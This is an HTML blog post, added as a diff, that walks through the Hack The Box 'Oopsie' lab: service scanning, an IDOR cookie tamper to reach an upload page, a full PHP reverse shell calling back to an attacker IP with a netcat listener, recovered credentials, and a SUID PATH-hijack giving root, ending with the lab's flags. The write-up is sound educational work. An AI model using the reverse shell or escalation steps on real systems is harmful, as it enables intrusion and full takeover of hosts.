@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>HTB Oopsie &mdash; purplepyram1d</title>
+<meta name="description" content="1 Initial Recon Set the target IP to avoid retyping. Ping the box, then run the initial nmap scan. Why nmap -sC -sV - -sC is the default NSE (Nmap Scripting Engine) script set. Whe">
+<meta name="author" content="Johnny Meintel">
+<link rel="icon" href="../../assets/images/logo-pyramid.png">
+<link rel="stylesheet" href="../../assets/css/site.css">
+
+<link rel="canonical" href="https://johnnymeintel.com/blog/posts/htb-oopsie.html">
+
+<meta property="og:title" content="HTB Oopsie">
+<meta property="og:description" content="1 Initial Recon Set the target IP to avoid retyping. Ping the box, then run the initial nmap scan. Why nmap -sC -sV - -sC is the default NSE (Nmap Scripting Engine) script set. Whe">
+<meta property="og:type" content="article">
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<div class="wrap">
+
+  <header class="masthead compact">
+    <div class="mast-row">
+      <div>
+        <a href="../../index.html"><h1 class="title sm">purplepyram<span class="dim">1</span>d</h1></a>
+      </div>
+      <nav class="mast-nav" aria-label="Primary">
+        <a href="../../index.html">Contents</a>
+        <a href="../index.html">Writing</a>
+        <a href="../../rooted.html">Log</a>
+        <a href="https://github.com/purplepyram1d">GitHub</a>
+      </nav>
+    </div>
+  </header>
+
+  <main id="main" style="margin-top:2.5rem;">
+  <div class="grid">
+
+    <div class="rail">
+      <span>2026-04-24</span>
+      <span class="em">IDOR</span>
+      <span>~11 min</span>
+    </div>
+
+    <article>
+      <h1>HTB Oopsie</h1>
+      <div class="art-meta">Johnny Meintel &middot; 2026-04-24</div>
+
+      <h2><span class="n">1</span>Initial Recon</h2>
+      <ul>
+        <li>Set the target IP to avoid retyping. Ping the box, then run the initial <code>nmap</code> scan.</li>
+        <li>Why <code>nmap -sC -sV</code></li>
+      </ul>
+      <p>- <code>-sC</code> is the default NSE (Nmap Scripting Engine) script set. When it sees an open port, it runs standard scripts against services relevant to that port to reveal additional details. This includes SMB security mode, SSH host keys, SSL/TLS certificate details, and more. - <code>-sV</code> runs service version detection. Nmap probes the open port to find out what service is actually listening there, along with version info to help you decide what tools to use next or what weaknesses might exist.</p>
+      <pre># Set target IP
+boxip="10.129.x.x"
+
+# Initial ping
+ping $boxip -c 3
+
+# Basic recon
+nmap -sC -sV $boxip</pre>
+      <h2><span class="n">2</span>Nmap Output</h2>
+      <pre>Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-22 10:45 -0400
+Nmap scan report for 10.129.95.191
+Host is up (0.070s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
+|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
+|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.51 seconds</pre>
+      <h2><span class="n">3</span>Findings</h2>
+      <p>### Findings Part 1 - Open Ports and HTTP Clues</p>
+      <ul>
+        <li><code>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</code> - could be useful after obtaining credentials later in the attack chain.</li>
+        <li><code>80/tcp open http Apache httpd 2.4.29 (Ubuntu)</code> - primary public attack surface. It is not up to date; the latest version is 2.4.66.</li>
+      </ul>
+      <p>Since there is a public-facing web server, use <strong>cURL</strong> to collect raw headers and content. This can reveal banners, redirects, cookies, internal naming, and hidden application hints.</p>
+      <pre># Grab headers and page content
+curl -i http://$boxip</pre>
+      <ul>
+        <li><code>HTTP/1.1 200 OK</code> - the web page is online and responding to requests.</li>
+        <li><code>Server: Apache/2.4.29 (Ubuntu)</code> - this confirms the same server version result from the Nmap scan.</li>
+        <li><code>Content-Type: text/html; charset=UTF-8</code> - the web page is serving standard HTML instead of being something like a file download page.</li>
+      </ul>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/01.png" alt="Step 1 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 1.</span></figcaption>
+      </figure>
+      <p>After visiting the actual web page in Firefox:</p>
+      <ul>
+        <li>The site presents itself as <strong>MegaCorp Automotive</strong>.</li>
+        <li>The page references static directories such as <code>/css</code>, <code>/themes</code>, <code>/images</code>, and <code>/js</code>.</li>
+        <li>The footer exposes <code>admin@megacorp.com</code>.</li>
+        <li>The page states that users must log in to access the actual service.</li>
+      </ul>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/02.png" alt="Step 2 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 2.</span></figcaption>
+      </figure>
+      <p>After looking through the full HTTP response, <code>curl -i "http://$boxip" | tail</code> reveals a critical insight: two URLs that might come in handy later:</p>
+      <pre>&lt;script src="/cdn-cgi/login/script.js"&gt;&lt;/script&gt;
+&lt;script src="/js/index.js"&gt;&lt;/script&gt;</pre>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/03.png" alt="Step 3 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 3.</span></figcaption>
+      </figure>
+      <p>### Findings Part 2 - Directory Discovery</p>
+      <p>The login portal is known. Continue with directory and file discovery using two common tools:</p>
+      <ul>
+        <li><strong>Gobuster</strong> - answers "what obvious directories are here?"</li>
+      </ul>
+      <pre># Directory and file discovery
+gobuster dir -u http://$boxip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</pre>
+      <ul>
+        <li><code>dir</code> selects Gobuster's directory and file enumeration mode.</li>
+        <li><code>-u</code> sets the target URL to scan.</li>
+        <li><code>-w</code> provides the wordlist file containing the paths Gobuster will test.</li>
+      </ul>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/04.png" alt="Step 4 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 4.</span></figcaption>
+      </figure>
+      <pre>images   (Status: 301)
+themes   (Status: 301)
+uploads  (Status: 301)
+css      (Status: 301)
+js       (Status: 301)
+fonts    (Status: 301)</pre>
+      <p>Most relevant is <strong>uploads</strong>. This indicates application functionality beyond a static page.</p>
+      <ul>
+        <li><strong>ffuf</strong> can better answer "how does the web application respond when I do this?"</li>
+      </ul>
+      <pre>ffuf -u http://$boxip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -mc 200,301,302,403</pre>
+      <ul>
+        <li><code>-u</code> sets the target URL and marks <code>FUZZ</code> as the position where each wordlist entry will be inserted.</li>
+        <li><code>-w</code> provides the wordlist file that <code>ffuf</code> will iterate through.</li>
+        <li><code>-mc</code> means "match codes" and tells <code>ffuf</code> to show only responses with status codes <code>200</code>, <code>301</code>, <code>302</code>, or <code>403</code>.</li>
+      </ul>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/05.png" alt="Step 5 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 5.</span></figcaption>
+      </figure>
+      <pre>themes [Status: 301 ...]
+uploads [Status: 301 ...]
+css [Status: 301 ...]
+images [Status: 301 ...]
+js [Status: 301 ...]
+fonts [Status: 301 ...]</pre>
+      <ul>
+        <li>Same pages as the Gobuster results. Continue.</li>
+      </ul>
+      <p>### Findings Part 3 - Web Misconfiguration Checks</p>
+      <p>We have <code>/cdn-cgi/login/script.js</code> and <code>/uploads/</code>. Run <strong>nikto</strong> to check common web misconfigurations.</p>
+      <ul>
+        <li><strong>nikto</strong> is a long-standing web scanner focused on common misconfigurations, weak hardening, known files, and odd server behavior.</li>
+      </ul>
+      <pre>nikto -h http://$boxip -C all</pre>
+      <ul>
+        <li><code>-h</code> sets the target.</li>
+        <li><code>-C all</code> checks all CGI (Common Gateway Interface) directory possibilities.</li>
+      </ul>
+      <p>Results:</p>
+      <pre>+ Apache/2.4.29 appears to be outdated
++ /images: IP address found in the 'location' header. The IP is "127.0.1.1"
++ Suggested security header missing: content-security-policy
++ Suggested security header missing: permissions-policy
++ Suggested security header missing: x-content-type-options
++ Suggested security header missing: referrer-policy
++ Suggested security header missing: strict-transport-security
++ Web Server returns a valid response with junk HTTP methods which may cause false positives</pre>
+      <ul>
+        <li>We know this version of Apache is outdated from our earlier Nmap scan.</li>
+        <li><code>127.0.1.1</code> is commonly seen on Ubuntu systems as a hostname mapping.</li>
+        <li>Missing headers indicate weak browser side hardening.</li>
+      </ul>
+      <p>This is typical for an unencrypted web application. Move to <strong>SSH enumeration</strong>.</p>
+      <pre>nmap -p22 --script ssh-hostkey,ssh2-enum-algos "$boxip"</pre>
+      <ul>
+        <li><code>-p22</code> limits the scan to SSH.</li>
+        <li><code>ssh-hostkey</code> extracts SSH host key fingerprints.</li>
+        <li><code>ssh-enum-algos</code> is an NSE script that asks the server which SSH version 2 algorithm it supports.</li>
+      </ul>
+      <ul>
+        <li>No clear cryptographic weakness exists here. Moving on.</li>
+      </ul>
+      <p>### Findings Part 4 - Expanded Enumeration</p>
+      <p>The login page appeared in HTTP response data but not in initial Gobuster output. Re-run Gobuster with extension expansion.</p>
+      <pre>gobuster dir \
+  -u http://$boxip \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,txt,html</pre>
+      <ul>
+        <li><code>-x php,txt,html</code> expands guesses into names such as:</li>
+      </ul>
+      <p>- <code>login.php</code> - <code>index.php</code> - <code>notes.txt</code></p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/06.png" alt="Step 6 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 6.</span></figcaption>
+      </figure>
+      <p>### Findings Part 5 - Guest Access and Broken Authorization</p>
+      <p>First checkpoint question:</p>
+      <p><strong>Q1 - What kind of tool can intercept web traffic?</strong> <strong>Answer:</strong> <code>proxy</code></p>
+      <p>Command-line and browser recon established initial paths. Move to <strong>Burp Suite</strong> for *spidering* to discover application-referenced endpoints.</p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/07.png" alt="Step 7 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 7.</span></figcaption>
+      </figure>
+      <p>There's that <code>cdn-cgi/login</code> URL again.</p>
+      <p>After visiting the web page we are presented with a login portal which contains an option that states <code>Login as Guest</code>. After performing a guest login and attempting to access the <code>Uploads</code> page from the menu, we are met with a message that says <code>This action require super admin rights</code>.</p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/08.png" alt="Step 8 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 8.</span></figcaption>
+      </figure>
+      <p><strong>Q2 - What is the path to the directory on the web server that returns a login page?</strong> <strong>Answer:</strong> <code>cdn-cgi/login</code></p>
+      <p><strong>Q3 - What can be modified in Firefox to access the upload page?</strong> <strong>Answer:</strong> <code>cookie</code></p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/09.png" alt="Step 9 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 9.</span></figcaption>
+      </figure>
+      <p>Guest session cookie data is visible in browser developer tools. If the cookie contains client-trusted authorization state, modifying it can grant access to the <code>Uploads</code> portal.</p>
+      <p>Context note: this behavior maps to broken access control. Changing client-controlled identifiers should not grant higher privileges without server-side authorization checks.</p>
+      <p>Burp Suite has uncovered the URL portion which designates the user session:</p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/10.png" alt="Step 10 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 10.</span></figcaption>
+      </figure>
+      <p>Attempting to modify the URL directly:</p>
+      <p><code>http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code></p>
+      <p>Successfully reveals <code>Access ID 34322</code> for <code>admin</code>.</p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/11.png" alt="Step 11 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 11.</span></figcaption>
+      </figure>
+      <p><strong>Q4 - What is the access ID of the admin user?</strong> <strong>Answer:</strong> <code>34322</code></p>
+      <p>### Findings Part 6 - Upload Functionality and Foothold</p>
+      <p>Back in browser developer tools, we can edit the <code>guest</code> session ID with the admin access ID and then attempt to access <code>http://10.129.95.191/cdn-cgi/login/admin.php?content=uploads</code>.</p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/12.png" alt="Step 12 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 12.</span></figcaption>
+      </figure>
+      <p><code>Uploads</code> page is now accessible. Testing it out by uploading a text file containing the word <code>Test</code> produces the success message <code>The file Test.txt has been uploaded.</code></p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/13.png" alt="Step 13 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 13.</span></figcaption>
+      </figure>
+      <p><strong>Q5 - After uploading a file, in which directory does it appear on the server?</strong> <strong>Answer:</strong> <code>/uploads</code></p>
+      <p>The answer above was visible in earlier Gobuster output. Next, use upload functionality to deliver a PHP reverse shell that connects back to the attacker and enables remote command execution. Source script: <a href="https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php">BlackArch php-reverse-shell.php</a>.</p>
+      <pre>&lt;?php
+// Minimal reverse-shell stub for note-taking.
+// For full version, see: http://pentestmonkey.net/tools/php-reverse-shell
+
+set_time_limit(0);
+$ip = '10.10.15.134';  // CHANGE THIS (your tun0 IP)
+$port = 4444;          // CHANGE THIS
+
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+    die("$errstr ($errno)");
+}
+
+$descriptorspec = array(
+    0 =&gt; array("pipe", "r"),
+    1 =&gt; array("pipe", "w"),
+    2 =&gt; array("pipe", "w")
+);
+
+$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
+if (!is_resource($process)) {
+    die("ERROR: Can't spawn shell");
+}
+
+while (!feof($sock)) {
+    $input = fread($sock, 1400);
+    fwrite($pipes[0], $input);
+    fwrite($sock, fread($pipes[1], 1400));
+    fwrite($sock, fread($pipes[2], 1400));
+}
+
+fclose($sock);
+proc_close($process);
+?&gt;</pre>
+      <p>Set the script to the attacker <code>tun0</code> IP and listening port, then start a <code>netcat</code> listener:</p>
+      <pre># On attacker machine
+# Modify the script using the tun0 IP address and desired netcat port
+ip a | grep 'tun0'
+
+# Start the netcat listener
+nc -lvnp 4444</pre>
+      <p>Upload the file using the web page user interface.</p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/14.png" alt="Step 14 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 14.</span></figcaption>
+      </figure>
+      <p>After upload, check the <code>netcat</code> listener. Reverse shell confirmed.</p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/15.png" alt="Step 15 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 15.</span></figcaption>
+      </figure>
+      <p>### Findings Part 7 - Post-Exploitation and Privilege Escalation</p>
+      <p>Enumerate directories. Under <code>/var/www/html/</code>, the <code>/cdn-cgi/login</code> path contains <code>db.php</code>.</p>
+      <p><strong>Q6 - Which file contains the password shared with user <code>robert</code>?</strong> <strong>Answer:</strong> <code>db.php</code></p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/16.png" alt="Step 16 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 16.</span></figcaption>
+      </figure>
+      <pre>$ cat db.php
+&lt;?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?&gt;</pre>
+      <p>With <code>robert</code> credentials recovered, perform an additional credential check:</p>
+      <pre># Search the /cdn-cgi/login folder for password
+grep -R -i pass .</pre>
+      <p>Result:</p>
+      <pre>if($_POST["username"]==="admin" &amp;&amp; $_POST["password"]==="MEGACORP_4dm1n!!")
+&lt;input type="password" name="password" placeholder="Password" /&gt;</pre>
+      <p>Two passwords are now available. In <code>/home/</code>, locate <code>user.txt</code>.</p>
+      <pre>$ cat user.txt
+f2c74ee8db7983851ab2a96a44eb7981</pre>
+      <p>To authenticate as <code>robert</code>, first upgrade the shell to interactive mode.</p>
+      <pre># Make shell interactive
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+# Login as robert with password from db.php
+su robert
+# Password: M3g4C0rpUs3r!
+
+# Check user, location and permissions
+whoami
+ls
+id</pre>
+      <p><code>robert</code> belongs to the <code>bugtracker</code> group.</p>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/17.png" alt="Step 17 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 17.</span></figcaption>
+      </figure>
+      <p><strong>Q7 - Which executable uses the option <code>-group bugtracker</code> to identify files owned by the <code>bugtracker</code> group?</strong> <strong>Answer:</strong> <code>find</code></p>
+      <pre># Hides noisy 'permission denied' errors
+find / -type f -group bugtracker 2&gt;/dev/null</pre>
+      <figure>
+        <img src="../../assets/images/htb-oopsie/18.png" alt="Step 18 of the HTB Oopsie walkthrough.">
+        <figcaption><span class="lab">Fig 18.</span></figcaption>
+      </figure>
+      <p>Run <code>bugtracker</code> and enter test value <code>1</code>:</p>
+      <pre>------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+1
+---------------
+
+Binary package hint: ev-engine-lib
+
+Version: 3.3.3-1
+
+Reproduce:
+When loading library in firmware it seems to be crashed
+
+What you expected to happen:
+Synchronized browsing to be enabled since it is enabled for that site.
+
+What happened instead:
+Synchronized browsing is disabled. Even choosing VIEW &gt; SYNCHRONIZED BROWSING from menu does not stay enabled between connects.</pre>
+      <p>Inspect the binary permissions and type.</p>
+      <pre>ls -la /usr/bin/bugtracker &amp;&amp; file /usr/bin/bugtracker</pre>
+      <p>Result:</p>
+      <pre>-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped</pre>
+      <p><strong>Q8 - Regardless of who starts <code>bugtracker</code>, which user's privileges does it run with?</strong> <strong>Answer:</strong> <code>root</code></p>
+      <ul>
+        <li><strong>Finding:</strong> <code>rws</code> for the owner triplet (<code>rwx</code> position replaced by <code>s</code>).</li>
+        <li><strong>Interpretation</strong>: SUID means Set User ID (often written SetUID). On an executable, it instructs Linux to run the program with the effective user ID of the file owner. Here, that owner is <code>root</code>, so execution context is elevated to root privileges.</li>
+      </ul>
+      <p><strong>Q9 - What does SUID stand for?</strong> <strong>Answer:</strong> <code>Set User ID</code></p>
+      <p>Running the file again and entering an unexpected value of <code>1337</code> produces this output:</p>
+      <pre>------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1337
+1337
+---------------
+
+cat: /root/reports/1337: No such file or directory</pre>
+      <p>The insecurely called executable is <code>cat</code>. It appears to be invoked without an absolute path, enabling PATH hijack in this SUID context.</p>
+      <p><strong>Q10 - What is the name of the executable that is called in an insecure manner?</strong> <strong>Answer:</strong> <code>cat</code></p>
+      <pre># Move to a writable location where we can drop a fake executable.
+cd /tmp
+
+# Create a fake `cat` that spawns a preserved-privilege shell.
+printf '#!/bin/bash\n/bin/bash -p\n' &gt; cat
+
+# Make the fake `cat` executable.
+chmod +x cat
+
+# Prepend /tmp so our fake `cat` is resolved before /bin/cat.
+export PATH=/tmp:$PATH
+
+# Run the SUID binary so it invokes our fake `cat` as root.
+/usr/bin/bugtracker</pre>
+      <p>How this works:</p>
+      <ul>
+        <li><code>printf '#!/bin/bash\n/bin/bash -p\n' &gt; cat</code> writes a two-line shell script into a file named <code>cat</code> in the current directory.</li>
+        <li>The first line, <code>#!/bin/bash</code>, is the shebang. It tells the kernel to execute this file with Bash when the file is launched as a program.</li>
+        <li>The second line, <code>/bin/bash -p</code>, starts Bash in privileged mode. The <code>-p</code> flag matters because it tells Bash to preserve the effective UID and GID it inherited instead of dropping them.</li>
+        <li>Because <code>bugtracker</code> is SUID-root and appears to invoke <code>cat</code> without an absolute path, command lookup follows the current <code>PATH</code>.</li>
+        <li>After <code>export PATH=/tmp:$PATH</code>, the shell resolves <code>/tmp/cat</code> before <code>/bin/cat</code>, so the attacker-controlled script runs in place of the real utility.</li>
+        <li>Since the calling process has effective root privileges, and the replacement script immediately runs <code>bash -p</code>, the resulting shell retains those elevated privileges.</li>
+      </ul>
+      <p>Post-exploitation note: after reading flags, remove <code>/tmp/cat</code> and restore <code>PATH</code> to prevent command resolution issues.</p>
+      <h2><span class="n">4</span>Flags and Final Access</h2>
+      <p>User: <code>f2c74ee8db7983851ab2a96a44eb7981</code> Root: <code>af13b0bee69f8a877c3faf667f7beacf</code></p>
+      <h2><span class="n">5</span>Additional Learning Resources</h2>
+      <p>### Tools Used</p>
+      <ul>
+        <li><strong><code>nmap</code></strong>: initial host and service enumeration to identify the exposed HTTP and SSH attack surface.</li>
+        <li><strong><code>curl</code></strong>: raw HTTP inspection to capture headers, page content, redirects, and application clues directly from the response.</li>
+        <li><strong><code>gobuster</code></strong>: directory brute-forcing to enumerate reachable web paths with a wordlist.</li>
+        <li><strong><code>ffuf</code></strong>: fast content discovery and response filtering, useful for separating interesting results from routine noise.</li>
+        <li><strong><code>nikto</code></strong>: quick web server assessment for common misconfigurations and known risky patterns.</li>
+        <li><strong><code>nc</code></strong>: listener for the reverse shell triggered through the uploaded PHP payload.</li>
+        <li><strong><code>find</code></strong>: local filesystem enumeration after foothold, especially useful for locating files by ownership and group.</li>
+      </ul>
+      <p>### Useful Command Switches</p>
+      <ul>
+        <li><strong><code>nmap -sC -sV $boxip</code></strong></li>
+      </ul>
+      <p>- <code>-sC</code> runs the default NSE script set for standard service checks. - <code>-sV</code> probes open ports to identify the service and version in use.</p>
+      <ul>
+        <li><strong><code>curl -i http://$boxip</code></strong></li>
+      </ul>
+      <p>- <code>-i</code> includes the HTTP response headers along with the body, which is useful for seeing server banners, cookies, and status codes.</p>
+      <ul>
+        <li><strong><code>gobuster dir -u http://$boxip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code></strong></li>
+      </ul>
+      <p>- <code>dir</code> selects directory enumeration mode. - <code>-u</code> sets the target URL. - <code>-w</code> supplies the wordlist used for discovery.</p>
+      <ul>
+        <li><strong><code>ffuf -u http://$boxip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -mc 200,301,302,403</code></strong></li>
+      </ul>
+      <p>- <code>-u</code> defines the target template, with <code>FUZZ</code> marking the injection point for wordlist entries. - <code>-w</code> sets the wordlist. - <code>-mc</code> filters matches to the chosen HTTP status codes so interesting paths are easier to spot.</p>
+      <ul>
+        <li><strong><code>nikto -h http://$boxip -C all</code></strong></li>
+      </ul>
+      <p>- <code>-h</code> sets the target host. - <code>-C all</code> tests all CGI directories Nikto knows about, which broadens coverage during web assessment.</p>
+      <ul>
+        <li><strong><code>nc -lvnp 4444</code></strong></li>
+      </ul>
+      <p>- <code>-l</code> listens for an incoming connection. - <code>-v</code> enables verbose output. - <code>-n</code> avoids DNS resolution delays by using numeric addresses only. - <code>-p</code> specifies the listening port.</p>
+      <ul>
+        <li><strong><code>find / -type f -group bugtracker 2&gt;/dev/null</code></strong></li>
+      </ul>
+      <p>- <code>-type f</code> restricts results to regular files. - <code>-group bugtracker</code> filters for files owned by the <code>bugtracker</code> group. - <code>2&gt;/dev/null</code> suppresses noisy permission-denied errors from stderr.</p>
+      <p>### Suggested References</p>
+      <ul>
+        <li><a href="https://nmap.org/book/man.html">Nmap Reference Guide</a></li>
+        <li><a href="https://curl.se/docs/manpage.html">curl Manual</a></li>
+        <li><a href="https://github.com/OJ/gobuster">Gobuster GitHub Repository</a></li>
+        <li><a href="https://github.com/ffuf/ffuf">ffuf usage and options</a></li>
+        <li><a href="https://github.com/sullo/nikto">Nikto project documentation</a></li>
+        <li><a href="https://www.gnu.org/software/findutils/manual/html_node/find_html/Invoking-find.html">GNU find Manual</a></li>
+        <li><a href="https://man7.org/linux/man-pages/man1/chmod.1.html">Linux file permissions and SUID</a></li>
+        <li><a href="https://www.gnu.org/software/bash/manual/bash.html#Command-Search-and-Execution">PATH command search behavior in Bash</a></li>
+        <li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Broken Access Control</a></li>
+      </ul>
+
+      <hr>
+
+      <p class="kicker" style="font-family:var(--mono);font-size:.75rem;color:var(--ink-3);">
+        Rules and reproduction steps:
+        <a href="https://github.com/purplepyram1d/rmm-multiplicity" style="border-bottom:1px solid var(--rule);">github.com/purplepyram1d/rmm-multiplicity</a>
+      </p>
+    </article>
+  </div>
+  </main>
+
+  <footer>
+    <div class="grid">
+      <div class="rail"><span>about</span></div>
+      <div class="colophon">
+        <p class="fine">
+          <a href="https://github.com/purplepyram1d">github</a> &middot;
+          <a href="https://www.linkedin.com/in/johnnymeintel">linkedin</a><br>
+          <a href="../../index.html">&larr; contents</a>
+        </p>
+      </div>
+    </div>
+  </footer>
+
+</div>
+</body>
+</html>
